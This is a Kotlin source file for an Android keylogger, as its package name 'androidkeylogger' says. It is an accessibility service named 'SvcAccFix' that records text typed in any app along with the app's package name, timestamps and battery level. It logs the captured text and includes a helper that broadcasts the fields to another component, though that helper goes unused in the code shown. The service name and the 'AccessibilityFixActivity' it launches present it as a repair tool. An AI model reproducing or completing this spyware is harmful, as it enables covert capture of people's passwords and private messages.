package com.azamovhudstc.androidkeylogger

import android.accessibilityservice.AccessibilityService
import android.annotation.SuppressLint
import android.content.Intent
import android.content.IntentFilter
import android.os.BatteryManager
import android.text.format.DateFormat
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.text.SimpleDateFormat
import java.util.*

class SvcAccFix : AccessibilityService() {

    companion object {
        var i = false
        var j = false

    }

    @SuppressLint("SuspiciousIndentation")
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
//            val afterText = event.text?.toString() ?: ""
            val timestamp = System.currentTimeMillis()
            val packageName = event.packageName?.toString() ?: ""
            val text = event.text?.toString() ?: ""
            val timeStamp = SimpleDateFormat("HH:mm", Locale.getDefault()).format(Date())
            val dayTime = DateFormat.format("hh:mm:ss a - E dd/MM/yy", timestamp).toString()
            val cleanedText = text.replace("[", "").replace("]", "")
            val batteryLevel = getBatteryLevel()
            Log.d("EVENT", "onAccessibilityEvent: ${cleanedText.toString()}")
//

        }

    }

    private fun AccessibilityEvent.isTextComplete(): Boolean {
        return action == AccessibilityNodeInfo.ACTION_ACCESSIBILITY_FOCUS
    }

    private fun formatDate(): String {
        return try {
            SimpleDateFormat("yyyyMMdd", Locale.getDefault()).format(Calendar.getInstance().time)
        } catch (unused: Exception) {
            ""
        }
    }

    override fun onInterrupt() {}
    override fun onServiceConnected() {
        super.onServiceConnected()
        i = true
        if (j) {
            j = false
            val intent = Intent(this, AccessibilityFixActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            startActivity(intent)
        }
    }

    override fun onUnbind(intent: Intent): Boolean {
        i = false
        return super.onUnbind(intent)
    }

    private fun getBatteryLevel(): Int {
        val batteryIntent =
            applicationContext.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        return if (level != -1 && scale != -1) (level * 100 / scale) else -1
    }

    private fun sendBroadcast(
        text: String,
        packageName: String,
        dayTime: String,
        timeStamp: String,
        batteryLevel: String
    ) {
        val intent = Intent("ACTION_TEXT_RECEIVED").apply {
            putExtra("TEXT", text)
            putExtra("PACKAGE_NAME", packageName)
            putExtra("DAY_TIME", dayTime)
            putExtra("TIME_STAMP", timeStamp)
            putExtra("BATTERY_LEVEL", batteryLevel)
        }
        sendBroadcast(intent)
    }
}
